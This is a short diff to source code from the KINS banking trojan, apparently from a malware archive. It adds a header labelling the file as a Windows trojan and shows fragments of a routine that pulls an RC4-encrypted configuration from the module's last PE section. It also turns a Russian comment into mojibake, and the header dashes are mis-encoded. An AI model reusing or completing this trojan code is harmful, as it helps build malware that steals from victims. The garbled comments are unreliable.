@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 
@@ -44,7 +55,7 @@ BinStorage::STORAGE *DllConfig::getCurrent(void)
 	DWORD dataSize;
 	Crypt::RC4KEY rc4Key;
 
-	//Получаем конфиг.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		// get last section
 		const WORD sectionIndex = PeImage::_getNumberOfSections(coreDllData.modules.currentModule) - 1;
